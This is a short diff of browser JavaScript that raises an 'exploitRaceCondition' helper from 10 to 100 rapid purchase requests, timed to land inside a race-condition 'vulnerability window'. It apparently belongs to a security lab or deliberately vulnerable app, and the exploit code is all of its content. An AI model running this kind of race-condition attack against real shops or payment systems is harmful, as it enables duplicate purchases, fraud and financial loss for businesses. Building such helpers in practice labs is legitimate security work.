@@ -92,9 +92,9 @@
     // Exploit helper: rapid fire purchases
     window.exploitRaceCondition = function() {
         console.log('Attempting race condition exploit...');
-        console.log('Triggering 10 rapid purchase requests...');
+        console.log('Triggering 100 rapid purchase requests...');
         
-        for (let i = 0; i < 10; i++) {
+        for (let i = 0; i < 100; i++) {
             setTimeout(() => {
                 makePurchase();
             }, i * 10); // Stagger slightly but still within vulnerability window
